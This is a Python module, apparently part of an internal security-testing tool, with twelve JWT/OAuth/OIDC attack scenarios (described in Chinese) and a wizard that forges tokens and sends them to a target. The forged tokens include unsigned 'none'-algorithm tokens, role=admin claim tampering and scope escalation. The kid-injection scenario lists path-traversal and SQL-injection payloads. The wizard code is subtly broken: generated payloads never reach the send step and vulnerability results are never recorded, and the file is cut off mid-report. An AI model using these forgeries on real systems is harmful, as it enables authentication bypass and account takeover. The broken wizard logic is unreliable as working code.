"""
JWT/OAuth Scenarios Module - Vulnerability scenario templates and
one-click reproduction wizard.

This module provides:
    1. 10+ built-in JWT/OAuth vulnerability scenario templates
    2. One-click reproduction wizard for guided testing
    3. Automatic parameter extraction from requests
    4. Payload generation and request sending
    5. Response analysis and vulnerability reporting

Integration points:
    - MITM proxy traffic capture
    - JWT Editor module
    - OAuth Analyzer module
    - Report generation engine
    - PoC verification engine

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse

import aiohttp

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class ScenarioCategory(str, Enum):
    """Vulnerability scenario categories."""

    JWT = "jwt"
    OAUTH = "oauth"
    OIDC = "oidc"
    SESSION = "session"


class ScenarioDifficulty(str, Enum):
    """Scenario difficulty levels."""

    BEGINNER = "beginner"
    INTERMEDIATE = "intermediate"
    ADVANCED = "advanced"


class WizardStepType(str, Enum):
    """Wizard step types."""

    PARAMETER_EXTRACTION = "parameter_extraction"
    PAYLOAD_GENERATION = "payload_generation"
    REQUEST_SEND = "request_send"
    RESPONSE_ANALYSIS = "response_analysis"
    REPORT_GENERATION = "report_generation"


class Severity(str, Enum):
    """Vulnerability severity levels."""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class ScenarioTemplate:
    """Vulnerability scenario template.

    Attributes:
        scenario_id: Unique scenario identifier
        name: Scenario name
        category: Scenario category
        difficulty: Difficulty level
        description: Vulnerability description
        prerequisites: Prerequisites for testing
        test_steps: Step-by-step test instructions
        expected_result: Expected result if vulnerable
        remediation: Remediation recommendations
        mitre_id: MITRE ATT&CK technique ID
        severity: Vulnerability severity
        tags: Scenario tags
    """

    scenario_id: str = ""
    name: str = ""
    category: ScenarioCategory = ScenarioCategory.JWT
    difficulty: ScenarioDifficulty = ScenarioDifficulty.BEGINNER
    description: str = ""
    prerequisites: List[str] = field(default_factory=list)
    test_steps: List[str] = field(default_factory=list)
    expected_result: str = ""
    remediation: str = ""
    mitre_id: str = ""
    severity: Severity = Severity.INFO
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "scenario_id": self.scenario_id,
            "name": self.name,
            "category": self.category.value,
            "difficulty": self.difficulty.value,
            "description": self.description,
            "prerequisites": self.prerequisites,
            "test_steps": self.test_steps,
            "expected_result": self.expected_result,
            "remediation": self.remediation,
            "mitre_id": self.mitre_id,
            "severity": self.severity.value,
            "tags": self.tags,
        }


@dataclass
class WizardStep:
    """Wizard step representation.

    Attributes:
        step_number: Step number
        step_type: Type of step
        title: Step title
        description: Step description
        action: Action to perform
        parameters: Step parameters
        auto_execute: Whether to auto-execute
        completed: Whether step is completed
    """

    step_number: int = 0
    step_type: WizardStepType = WizardStepType.PARAMETER_EXTRACTION
    title: str = ""
    description: str = ""
    action: str = ""
    parameters: Dict[str, Any] = field(default_factory=dict)
    auto_execute: bool = False
    completed: bool = False

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "step_number": self.step_number,
            "step_type": self.step_type.value,
            "title": self.title,
            "description": self.description,
            "action": self.action,
            "parameters": self.parameters,
            "auto_execute": self.auto_execute,
            "completed": self.completed,
        }


@dataclass
class WizardResult:
    """Wizard execution result.

    Attributes:
        scenario_id: Scenario identifier
        success: Whether wizard execution succeeded
        vulnerability_found: Whether vulnerability was found
        severity: Result severity
        steps_executed: Number of steps executed
        execution_time_ms: Total execution time
        evidence: Evidence of vulnerability
        report: Generated report
        timestamp: Result timestamp
    """

    scenario_id: str = ""
    success: bool = False
    vulnerability_found: bool = False
    severity: Severity = Severity.INFO
    steps_executed: int = 0
    execution_time_ms: float = 0.0
    evidence: Dict[str, Any] = field(default_factory=dict)
    report: str = ""
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary.

        Returns:
            Dictionary representation.
        """
        return {
            "scenario_id": self.scenario_id,
            "success": self.success,
            "vulnerability_found": self.vulnerability_found,
            "severity": self.severity.value,
            "steps_executed": self.steps_executed,
            "execution_time_ms": self.execution_time_ms,
            "evidence": self.evidence,
            "report": self.report,
            "timestamp": self.timestamp,
        }


# =============================================================================
# Scenario Template Library
# =============================================================================

class ScenarioTemplateLibrary:
    """Library of JWT/OAuth vulnerability scenario templates.

    Contains 10+ built-in scenarios for common vulnerabilities.
    """

    def __init__(self) -> None:
        """Initialize the scenario template library."""
        self.templates: Dict[str, ScenarioTemplate] = {}
        self._load_builtin_templates()

    def _load_builtin_templates(self) -> None:
        """Load built-in scenario templates."""
        templates = [
            self._none_algorithm_scenario(),
            self._rs256_to_hs256_scenario(),
            self._kid_injection_scenario(),
            self._oauth_missing_state_scenario(),
            self._oauth_redirect_uri_scenario(),
            self._oauth_implicit_flow_scenario(),
            self._oauth_pkce_missing_scenario(),
            self._jwt_no_expiration_scenario(),
            self._jwt_claim_tampering_scenario(),
            self._oauth_scope_escalation_scenario(),
            self._oidc_email_verified_bypass_scenario(),
            self._jwt_cross_service_scenario(),
        ]

        for template in templates:
            self.templates[template.scenario_id] = template

    def _none_algorithm_scenario(self) -> ScenarioTemplate:
        """Create none algorithm bypass scenario.

        Returns:
            ScenarioTemplate for none algorithm attack.
        """
        return ScenarioTemplate(
            scenario_id="JWT-SCN-001",
            name="使用none算法绕过认证",
            category=ScenarioCategory.JWT,
            difficulty=ScenarioDifficulty.BEGINNER,
            description="将JWT的alg字段修改为none，移除签名，测试服务器是否接受无签名的JWT。",
            prerequisites=[
                "获取目标JWT令牌",
                "确认目标使用JWT进行认证",
            ],
            test_steps=[
                "1. 从请求中提取JWT令牌",
                "2. 解码JWT Header，将alg字段修改为'none'",
                "3. 移除JWT的签名部分",
                "4. 使用修改后的JWT发送请求",
                "5. 检查服务器是否接受该JWT",
            ],
            expected_result="服务器返回200状态码，表示接受了无签名的JWT",
            remediation="禁止使用none算法，强制要求所有JWT使用安全的签名算法（如RS256、ES256）。",
            mitre_id="T1550.001",
            severity=Severity.CRITICAL,
            tags=["jwt", "algorithm", "none", "authentication-bypass"],
        )

    def _rs256_to_hs256_scenario(self) -> ScenarioTemplate:
        """Create RS256 to HS256 downgrade scenario.

        Returns:
            ScenarioTemplate for algorithm downgrade attack.
        """
        return ScenarioTemplate(
            scenario_id="JWT-SCN-002",
            name="RS256降级HS256伪造管理员令牌",
            category=ScenarioCategory.JWT,
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            description="当目标同时支持RS256和HS256时，使用公开的RSA公钥作为HS256密钥签名JWT。",
            prerequisites=[
                "获取目标JWT令牌（RS256算法）",
                "获取目标的RSA公钥（从JWKS端点或TLS证书）",
            ],
            test_steps=[
                "1. 从JWKS端点或TLS证书获取RSA公钥",
                "2. 解码原始JWT的Payload",
                "3. 修改Payload中的权限声明（如role=admin）",
                "4. 将Header的alg修改为HS256",
                "5. 使用RSA公钥作为HMAC密钥重新签名",
                "6. 发送伪造的JWT到目标服务器",
            ],
            expected_result="服务器接受伪造的JWT，返回管理员权限的资源",
            remediation="在服务器端明确指定接受的算法列表，不要同时支持非对称和对称算法。",
            mitre_id="T1550.001",
            severity=Severity.CRITICAL,
            tags=["jwt", "algorithm-confusion", "downgrade", "privilege-escalation"],
        )

    def _kid_injection_scenario(self) -> ScenarioTemplate:
        """Create kid injection scenario.

        Returns:
            ScenarioTemplate for kid injection attack.
        """
        return ScenarioTemplate(
            scenario_id="JWT-SCN-003",
            name="通过kid注入读取服务器文件",
            category=ScenarioCategory.JWT,
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            description="利用JWT Header中的kid参数进行路径注入，读取服务器文件或执行SQL注入。",
            prerequisites=[
                "获取目标JWT令牌",
                "确认JWT使用kid参数指定密钥ID",
            ],
            test_steps=[
                "1. 解码JWT Header，找到kid字段",
                "2. 将kid修改为路径遍历Payload（如../../../etc/passwd）",
                "3. 或使用SQL注入Payload（如' OR 1=1 --）",
                "4. 重新签名JWT（如果需要）",
                "5. 发送修改后的JWT到目标",
                "6. 检查错误响应中是否包含文件内容或数据库错误",
            ],
            expected_result="错误响应中包含文件内容或SQL语法错误",
            remediation="严格验证kid参数，使用白名单验证，禁止路径遍历字符。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["jwt", "kid-injection", "path-traversal", "sql-injection"],
        )

    def _oauth_missing_state_scenario(self) -> ScenarioTemplate:
        """Create OAuth missing state scenario.

        Returns:
            ScenarioTemplate for missing state parameter.
        """
        return ScenarioTemplate(
            scenario_id="OAUTH-SCN-001",
            name="OAuth缺少state参数导致CSRF账户绑定",
            category=ScenarioCategory.OAUTH,
            difficulty=ScenarioDifficulty.BEGINNER,
            description="OAuth授权请求中缺少state参数，攻击者可构造恶意授权链接诱导用户点击，将授权码绑定到攻击者账户。",
            prerequisites=[
                "目标使用OAuth 2.0授权码流程",
                "授权请求中缺少state参数",
            ],
            test_steps=[
                "1. 捕获OAuth授权请求",
                "2. 检查URL中是否包含state参数",
                "3. 如果没有state参数，构造恶意授权链接",
                "4. 将redirect_uri指向攻击者控制的服务器",
                "5. 诱导目标用户点击恶意链接",
                "6. 接收授权码并兑换Access Token",
            ],
            expected_result="成功获取用户的授权码并兑换为Access Token",
            remediation="所有OAuth授权请求必须包含随机且不可预测的state参数。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["oauth", "csrf", "state-parameter", "account-takeover"],
        )

    def _oauth_redirect_uri_scenario(self) -> ScenarioTemplate:
        """Create OAuth redirect URI bypass scenario.

        Returns:
            ScenarioTemplate for redirect URI bypass.
        """
        return ScenarioTemplate(
            scenario_id="OAUTH-SCN-002",
            name="重定向URI未验证导致授权码泄露",
            category=ScenarioCategory.OAUTH,
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            description="OAuth服务器未严格验证redirect_uri，攻击者可将授权码重定向到恶意域名。",
            prerequisites=[
                "目标使用OAuth 2.0授权码流程",
                "redirect_uri验证不严格",
            ],
            test_steps=[
                "1. 捕获OAuth授权请求",
                "2. 修改redirect_uri为攻击者控制的域名",
                "3. 尝试各种绕过技术（路径遍历、子域名、编码等）",
                "4. 发送修改后的授权请求",
                "5. 检查授权码是否被重定向到恶意域名",
            ],
            expected_result="授权码被发送到攻击者控制的域名",
            remediation="严格验证redirect_uri，使用精确匹配而非前缀匹配。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["oauth", "redirect-uri", "authorization-code-leak"],
        )

    def _oauth_implicit_flow_scenario(self) -> ScenarioTemplate:
        """Create OAuth implicit flow scenario.

        Returns:
            ScenarioTemplate for implicit flow hijacking.
        """
        return ScenarioTemplate(
            scenario_id="OAUTH-SCN-003",
            name="隐式流Access Token泄露",
            category=ScenarioCategory.OAUTH,
            difficulty=ScenarioDifficulty.BEGINNER,
            description="OAuth隐式流（response_type=token）将Access Token暴露在URL Fragment中，可被Referer头泄露。",
            prerequisites=[
                "目标使用OAuth隐式流",
                "response_type=token",
            ],
            test_steps=[
                "1. 确认目标使用隐式流（response_type=token）",
                "2. 构造恶意页面，包含指向目标资源的链接",
                "3. 用户登录后，Access Token会出现在URL Fragment中",
                "4. 通过Referer头或JavaScript读取泄露的Token",
            ],
            expected_result="成功获取用户的Access Token",
            remediation="使用授权码流程配合PKCE替代隐式流。",
            mitre_id="T1550.001",
            severity=Severity.MEDIUM,
            tags=["oauth", "implicit-flow", "token-leak", "referer"],
        )

    def _oauth_pkce_missing_scenario(self) -> ScenarioTemplate:
        """Create OAuth PKCE missing scenario.

        Returns:
            ScenarioTemplate for missing PKCE.
        """
        return ScenarioTemplate(
            scenario_id="OAUTH-SCN-004",
            name="授权码流程未启用PKCE",
            category=ScenarioCategory.OAUTH,
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            description="OAuth授权码流程未使用PKCE，攻击者可拦截授权码并兑换Access Token。",
            prerequisites=[
                "目标使用OAuth授权码流程",
                "未启用PKCE（缺少code_challenge）",
            ],
            test_steps=[
                "1. 捕获OAuth授权请求",
                "2. 检查是否包含code_challenge参数",
                "3. 如果没有PKCE，拦截用户的授权码",
                "4. 使用拦截的授权码兑换Access Token",
            ],
            expected_result="成功使用拦截的授权码兑换Access Token",
            remediation="所有OAuth客户端都应使用PKCE，特别是公共客户端。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["oauth", "pkce", "authorization-code-interception"],
        )

    def _jwt_no_expiration_scenario(self) -> ScenarioTemplate:
        """Create JWT no expiration scenario.

        Returns:
            ScenarioTemplate for JWT without expiration.
        """
        return ScenarioTemplate(
            scenario_id="JWT-SCN-004",
            name="JWT永不过期导致长期访问风险",
            category=ScenarioCategory.JWT,
            difficulty=ScenarioDifficulty.BEGINNER,
            description="JWT的Payload中没有exp字段，令牌永不过期，一旦泄露可被长期使用。",
            prerequisites=[
                "获取目标JWT令牌",
            ],
            test_steps=[
                "1. 解码JWT Payload",
                "2. 检查是否包含exp字段",
                "3. 如果没有exp字段，记录该漏洞",
                "4. 测试该JWT是否可长期访问受保护资源",
            ],
            expected_result="JWT可无限期访问受保护资源",
            remediation="所有JWT都必须设置合理的过期时间，建议不超过1小时。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["jwt", "expiration", "long-lived-token"],
        )

    def _jwt_claim_tampering_scenario(self) -> ScenarioTemplate:
        """Create JWT claim tampering scenario.

        Returns:
            ScenarioTemplate for claim tampering.
        """
        return ScenarioTemplate(
            scenario_id="JWT-SCN-005",
            name="JWT声明篡改提升权限",
            category=ScenarioCategory.JWT,
            difficulty=ScenarioDifficulty.BEGINNER,
            description="修改JWT Payload中的权限声明（如role、admin、scope），测试服务器是否验证签名。",
            prerequisites=[
                "获取目标JWT令牌",
            ],
            test_steps=[
                "1. 解码JWT Payload",
                "2. 修改权限相关声明（role=admin、admin=true）",
                "3. 保持原始签名不变",
                "4. 发送修改后的JWT到目标",
                "5. 检查是否获得更高权限",
            ],
            expected_result="服务器接受修改后的JWT，返回更高权限的资源",
            remediation="服务器必须验证JWT签名，拒绝任何篡改的令牌。",
            mitre_id="T1550.001",
            severity=Severity.CRITICAL,
            tags=["jwt", "claim-tampering", "privilege-escalation"],
        )

    def _oauth_scope_escalation_scenario(self) -> ScenarioTemplate:
        """Create OAuth scope escalation scenario.

        Returns:
            ScenarioTemplate for scope escalation.
        """
        return ScenarioTemplate(
            scenario_id="OAUTH-SCN-005",
            name="OAuth作用域提升获取额外权限",
            category=ScenarioCategory.OAUTH,
            difficulty=ScenarioDifficulty.INTERMEDIATE,
            description="在OAuth授权请求中添加超出客户端注册范围的额外Scope，测试服务器是否验证。",
            prerequisites=[
                "目标使用OAuth 2.0",
                "已知客户端ID和注册的作用域",
            ],
            test_steps=[
                "1. 捕获OAuth授权请求",
                "2. 在scope参数中添加额外作用域（如admin、offline_access）",
                "3. 发送修改后的授权请求",
                "4. 检查返回的Access Token是否包含额外作用域",
            ],
            expected_result="Access Token包含额外的高权限作用域",
            remediation="服务器应严格验证请求的作用域是否在客户端注册范围内。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["oauth", "scope-escalation", "privilege-escalation"],
        )

    def _oidc_email_verified_bypass_scenario(self) -> ScenarioTemplate:
        """Create OIDC email_verified bypass scenario.

        Returns:
            ScenarioTemplate for email_verified bypass.
        """
        return ScenarioTemplate(
            scenario_id="OIDC-SCN-001",
            name="OIDC email_verified声明绕过",
            category=ScenarioCategory.OIDC,
            difficulty=ScenarioDifficulty.ADVANCED,
            description="构造包含email_verified=true的ID Token，测试客户端是否验证该声明的真实性。",
            prerequisites=[
                "目标使用OIDC进行身份验证",
                "客户端依赖email_verified声明",
            ],
            test_steps=[
                "1. 获取原始ID Token",
                "2. 解码并修改Payload，设置email为目标邮箱",
                "3. 设置email_verified=true",
                "4. 使用none算法或篡改签名",
                "5. 发送修改后的ID Token",
                "6. 检查是否成功冒充目标邮箱用户",
            ],
            expected_result="成功冒充目标邮箱用户并登录",
            remediation="客户端必须验证ID Token签名，不能仅依赖声明内容。",
            mitre_id="T1606",
            severity=Severity.CRITICAL,
            tags=["oidc", "email-verified", "account-takeover", "claim-injection"],
        )

    def _jwt_cross_service_scenario(self) -> ScenarioTemplate:
        """Create JWT cross-service scenario.

        Returns:
            ScenarioTemplate for cross-service token confusion.
        """
        return ScenarioTemplate(
            scenario_id="JWT-SCN-006",
            name="JWT跨服务令牌混淆",
            category=ScenarioCategory.JWT,
            difficulty=ScenarioDifficulty.ADVANCED,
            description="同一JWT在多个微服务中使用，但在不同服务中拥有不同权限，导致权限混淆。",
            prerequisites=[
                "目标使用多个微服务",
                "微服务共享同一JWT",
            ],
            test_steps=[
                "1. 获取目标JWT令牌",
                "2. 使用该JWT访问服务A，记录权限级别",
                "3. 使用同一JWT访问服务B，记录权限级别",
                "4. 比较两个服务的权限差异",
                "5. 如果在服务B中拥有更高权限，标记为跨服务权限混淆",
            ],
            expected_result="同一JWT在不同服务中拥有不同权限",
            remediation="每个服务应独立验证JWT，使用不同的audience声明。",
            mitre_id="T1550.001",
            severity=Severity.HIGH,
            tags=["jwt", "cross-service", "permission-confusion"],
        )

    def get_template(self, scenario_id: str) -> Optional[ScenarioTemplate]:
        """Get scenario template by ID.

        Args:
            scenario_id: Scenario identifier.

        Returns:
            ScenarioTemplate if found, None otherwise.
        """
        return self.templates.get(scenario_id)

    def get_templates_by_category(
        self, category: ScenarioCategory
    ) -> List[ScenarioTemplate]:
        """Get templates by category.

        Args:
            category: Scenario category.

        Returns:
            List of ScenarioTemplate.
        """
        return [
            t for t in self.templates.values() if t.category == category
        ]

    def get_templates_by_difficulty(
        self, difficulty: ScenarioDifficulty
    ) -> List[ScenarioTemplate]:
        """Get templates by difficulty.

        Args:
            difficulty: Difficulty level.

        Returns:
            List of ScenarioTemplate.
        """
        return [
            t for t in self.templates.values() if t.difficulty == difficulty
        ]

    def get_all_templates(self) -> List[ScenarioTemplate]:
        """Get all scenario templates.

        Returns:
            List of all ScenarioTemplate.
        """
        return list(self.templates.values())


# =============================================================================
# One-Click Reproduction Wizard
# =============================================================================

class OneClickReproductionWizard:
    """One-click reproduction wizard for guided vulnerability testing.

    Guides users through scenario testing with automatic parameter
    extraction, payload generation, and response analysis.
    """

    def __init__(
        self,
        scenario: ScenarioTemplate,
        request_url: str,
        request_headers: Dict[str, str],
        request_body: str = "",
    ) -> None:
        """Initialize the reproduction wizard.

        Args:
            scenario: Scenario template to execute.
            request_url: Original request URL.
            request_headers: Original request headers.
            request_body: Original request body.
        """
        self.scenario = scenario
        self.request_url = request_url
        self.request_headers = request_headers
        self.request_body = request_body
        self.steps: List[WizardStep] = []
        self.extracted_params: Dict[str, Any] = {}
        self.results: List[Dict[str, Any]] = []

    def generate_wizard_steps(self) -> List[WizardStep]:
        """Generate wizard steps based on scenario.

        Returns:
            List of WizardStep.
        """
        self.steps = [
            WizardStep(
                step_number=1,
                step_type=WizardStepType.PARAMETER_EXTRACTION,
                title="提取JWT/OAuth参数",
                description="从请求中自动提取JWT令牌或OAuth参数",
                action="extract_parameters",
                auto_execute=True,
            ),
            WizardStep(
                step_number=2,
                step_type=WizardStepType.PAYLOAD_GENERATION,
                title="生成测试Payload",
                description=f"根据场景'{self.scenario.name}'生成攻击Payload",
                action="generate_payload",
                auto_execute=True,
            ),
            WizardStep(
                step_number=3,
                step_type=WizardStepType.REQUEST_SEND,
                title="发送测试请求",
                description="发送修改后的请求到目标服务器",
                action="send_request",
                auto_execute=False,
            ),
            WizardStep(
                step_number=4,
                step_type=WizardStepType.RESPONSE_ANALYSIS,
                title="分析响应结果",
                description="分析服务器响应，判断是否存在漏洞",
                action="analyze_response",
                auto_execute=True,
            ),
            WizardStep(
                step_number=5,
                step_type=WizardStepType.REPORT_GENERATION,
                title="生成漏洞报告",
                description="自动生成漏洞报告和修复建议",
                action="generate_report",
                auto_execute=True,
            ),
        ]

        return self.steps

    async def execute_wizard(
        self,
        timeout: int = 10,
    ) -> WizardResult:
        """Execute the full wizard workflow.

        Args:
            timeout: Request timeout in seconds.

        Returns:
            WizardResult with execution results.
        """
        start_time = time.time()

        self.generate_wizard_steps()

        for step in self.steps:
            try:
                if step.step_type == WizardStepType.PARAMETER_EXTRACTION:
                    await self._execute_parameter_extraction(step)

                elif step.step_type == WizardStepType.PAYLOAD_GENERATION:
                    await self._execute_payload_generation(step)

                elif step.step_type == WizardStepType.REQUEST_SEND:
                    await self._execute_request_send(step, timeout)

                elif step.step_type == WizardStepType.RESPONSE_ANALYSIS:
                    await self._execute_response_analysis(step)

                elif step.step_type == WizardStepType.REPORT_GENERATION:
                    await self._execute_report_generation(step)

                step.completed = True

            except Exception as e:
                logger.error(f"Wizard step {step.step_number} failed: {e}")
                step.completed = False

        execution_time = (time.time() - start_time) * 1000

        vulnerability_found = any(
            r.get("vulnerable", False) for r in self.results
        )

        severity = self.scenario.severity if vulnerability_found else Severity.INFO

        return WizardResult(
            scenario_id=self.scenario.scenario_id,
            success=all(s.completed for s in self.steps),
            vulnerability_found=vulnerability_found,
            severity=severity,
            steps_executed=len([s for s in self.steps if s.completed]),
            execution_time_ms=execution_time,
            evidence=self._collect_evidence(),
            report=self._generate_final_report(),
            timestamp=time.time(),
        )

    async def _execute_parameter_extraction(
        self, step: WizardStep
    ) -> None:
        """Execute parameter extraction step.

        Args:
            step: Wizard step to execute.
        """
        auth_header = self.request_headers.get("Authorization", "")

        if auth_header.startswith("Bearer "):
            self.extracted_params["jwt_token"] = auth_header[7:]

        parsed = urlparse(self.request_url)
        url_params = parse_qs(parsed.query)

        oauth_params = [
            "client_id", "redirect_uri", "scope", "state",
            "response_type", "code", "access_token", "refresh_token",
        ]

        for param in oauth_params:
            if param in url_params:
                self.extracted_params[param] = url_params[param][0]

        if self.request_body:
            body_params = parse_qs(self.request_body)
            for param in oauth_params:
                if param in body_params:
                    self.extracted_params[param] = body_params[param][0]

        step.parameters = self.extracted_params

    async def _execute_payload_generation(
        self, step: WizardStep
    ) -> None:
        """Execute payload generation step.

        Args:
            step: Wizard step to execute.
        """
        scenario_id = self.scenario.scenario_id

        if "JWT-SCN-001" in scenario_id:
            step.parameters["payload"] = self._generate_none_alg_payload()

        elif "JWT-SCN-002" in scenario_id:
            step.parameters["payload"] = self._generate_downgrade_payload()

        elif "JWT-SCN-005" in scenario_id:
            step.parameters["payload"] = self._generate_claim_tamper_payload()

        elif "OAUTH-SCN-001" in scenario_id:
            step.parameters["payload"] = self._generate_missing_state_payload()

        elif "OAUTH-SCN-005" in scenario_id:
            step.parameters["payload"] = self._generate_scope_escalation_payload()

        elif "OIDC-SCN-001" in scenario_id:
            step.parameters["payload"] = self._generate_email_verified_payload()

    async def _execute_request_send(
        self, step: WizardStep, timeout: int
    ) -> None:
        """Execute request send step.

        Args:
            step: Wizard step to execute.
            timeout: Request timeout.
        """
        payload = step.parameters.get("payload", {})

        test_url = payload.get("url", self.request_url)
        test_headers = payload.get("headers", self.request_headers)
        test_body = payload.get("body", self.request_body)
        method = payload.get("method", "GET")

        try:
            async with aiohttp.ClientSession() as session:
                if method.upper() == "GET":
                    async with session.get(
                        test_url, headers=test_headers, timeout=timeout
                    ) as response:
                        body = await response.text()
                        step.parameters["response"] = {
                            "status": response.status,
                            "body": body,
                            "headers": dict(response.headers),
                        }
                        self.results.append(step.parameters["response"])

                elif method.upper() == "POST":
                    async with session.post(
                        test_url,
                        headers=test_headers,
                        data=test_body,
                        timeout=timeout,
                    ) as response:
                        body = await response.text()
                        step.parameters["response"] = {
                            "status": response.status,
                            "body": body,
                            "headers": dict(response.headers),
                        }
                        self.results.append(step.parameters["response"])

        except Exception as e:
            logger.error(f"Request send failed: {e}")
            step.parameters["response"] = {"error": str(e)}

    async def _execute_response_analysis(
        self, step: WizardStep
    ) -> None:
        """Execute response analysis step.

        Args:
            step: Wizard step to execute.
        """
        response = step.parameters.get("response", {})
        status = response.get("status", 0)
        body = response.get("body", "")

        vulnerable = False

        if self.scenario.scenario_id in ("JWT-SCN-001", "JWT-SCN-002", "JWT-SCN-005"):
            vulnerable = status == 200

        elif self.scenario.scenario_id in ("OAUTH-SCN-001", "OAUTH-SCN-002"):
            vulnerable = "code=" in body or "access_token=" in body

        elif self.scenario.scenario_id == "OAUTH-SCN-005":
            vulnerable = "admin" in body.lower() or "offline_access" in body.lower()

        elif self.scenario.scenario_id == "OIDC-SCN-001":
            vulnerable = status == 200 and "email" in body.lower()

        step.parameters["analysis"] = {
            "vulnerable": vulnerable,
            "status_code": status,
            "indicators": self._extract_vulnerability_indicators(body),
        }

    async def _execute_report_generation(
        self, step: WizardStep
    ) -> None:
        """Execute report generation step.

        Args:
            step: Wizard step to execute.
        """
        analysis = step.parameters.get("analysis", {})
        vulnerable = analysis.get("vulnerable", False)

        report = f"""
# 漏洞报告: {self.scenario.name}

## 基本信息
- 场景ID: {self.scenario.scenario_id}
- 类别: {self.scenario.category.value}
- 难度: {self.scenario.difficulty.value}
- 严重性: {self.scenario.severity.value}
- MITRE ATT&CK: {self.scenario.mitre_id}

## 漏洞描述
{self.scenario.description}

## 测试结果
- 是否存在漏洞: {'是' if vulnerable else '否'}
- 响应状态码: {analysis.get('status_code', 'N/A')}
- 漏洞指标: {analysis.get('indicators', [])}

## 修复建议
{self.scenario.remediation}
"""

        step.parameters["report"] = report

    def _generate_none_alg_payload(self) -> Dict[str, Any]:
        """Generate none algorithm payload.

        Returns:
            Payload dictionary.
        """
        jwt_token = self.extracted_params.get("jwt_token", "")

        if not jwt_token:
            return {}

        parts = jwt_token.split(".")
        if len(parts) != 3:
            return {}

        header_b64 = parts[0]
        payload_b64 = parts[1]

        header_json = base64.urlsafe_b64decode(
            header_b64 + "=" * (4 - len(header_b64) % 4)
        ).decode()

        header = json.loads(header_json)
        header["alg"] = "none"

        new_header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip("=")

        forged_token = f"{new_header_b64}.{payload_b64}."

        return {
            "url": self.request_url,
            "method": "GET",
            "headers": {
                **self.request_headers,
                "Authorization": f"Bearer {forged_token}",
            },
        }

    def _generate_downgrade_payload(self) -> Dict[str, Any]:
        """Generate algorithm downgrade payload.

        Returns:
            Payload dictionary.
        """
        return {
            "url": self.request_url,
            "method": "GET",
            "headers": self.request_headers,
            "note": "需要RSA公钥进行HS256签名",
        }

    def _generate_claim_tamper_payload(self) -> Dict[str, Any]:
        """Generate claim tampering payload.

        Returns:
            Payload dictionary.
        """
        jwt_token = self.extracted_params.get("jwt_token", "")

        if not jwt_token:
            return {}

        parts = jwt_token.split(".")
        if len(parts) != 3:
            return {}

        payload_b64 = parts[1]
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding

        try:
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            payload["role"] = "admin"
            payload["admin"] = True

            new_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip("=")

            forged_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"

            return {
                "url": self.request_url,
                "method": "GET",
                "headers": {
                    **self.request_headers,
                    "Authorization": f"Bearer {forged_token}",
                },
            }
        except Exception:
            return {}

    def _generate_missing_state_payload(self) -> Dict[str, Any]:
        """Generate missing state payload.

        Returns:
            Payload dictionary.
        """
        return {
            "url": self.request_url,
            "method": "GET",
            "headers": self.request_headers,
            "note": "检查URL中是否缺少state参数",
        }

    def _generate_scope_escalation_payload(self) -> Dict[str, Any]:
        """Generate scope escalation payload.

        Returns:
            Payload dictionary.
        """
        parsed = urlparse(self.request_url)
        params = parse_qs(parsed.query)

        current_scope = params.get("scope", [""])[0]
        escalated_scope = f"{current_scope} admin offline_access"

        params["scope"] = [escalated_scope]

        new_query = urlencode(params, doseq=True)
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

        return {
            "url": new_url,
            "method": "GET",
            "headers": self.request_headers,
        }

    def _generate_email_verified_payload(self) -> Dict[str, Any]:
        """Generate email_verified bypass payload.

        Returns:
            Payload dictionary.
        """
        return {
            "url": self.request_url,
            "method": "GET",
            "headers": self.request_headers,
            "note": "需要构造包含email_verified=true的ID Token",
        }

    def _extract_vulnerability_indicators(
        self, response_body: str
    ) -> List[str]:
        """Extract vulnerability indicators from response.

        Args:
            response_body: Response body content.

        Returns:
            List of indicator strings.
        """
        indicators: List[str] = []

        indicator_patterns = [
            "welcome",
            "dashboard",
            "admin",
            "profile",
            "settings",
            "user_id",
            "access_token",
            "refresh_token",
            "code=",
            "state=",
        ]

        body_lower = response_body.lower()

        for pattern in indicator_patterns:
            if pattern in body_lower:
                indicators.append(pattern)

        return indicators

    def _collect_evidence(self) -> Dict[str, Any]:
        """Collect evidence from wizard execution.

        Returns:
            Dictionary of evidence.
        """
        return {
            "extracted_params": self.extracted_params,
            "results": self.results,
            "scenario": self.scenario.to_dict(),
        }

    def _generate_final_report(self) -> str:
        """Generate final vulnerability report.

        Returns:
            Report string.
        """
        vulnerability_found = any(
            r.get("vulnerable", False)
            for r in self.results
            if isinstance(r, dict)
        )

        report = f"""
# JWT/OAuth 漏洞测试报告

## 场景信息
- 场景ID: {self.scenario.scenario_id}
- 场景名称: {self.scenario.name}
- 类别: {self.scenario.category.value}
- 难度: {self.scenario.difficulty.value}

## 漏洞描述
{self.scenario.description}

## 测试结果
- 是否存在漏洞: {'是' if vulnerability_found else '否'}
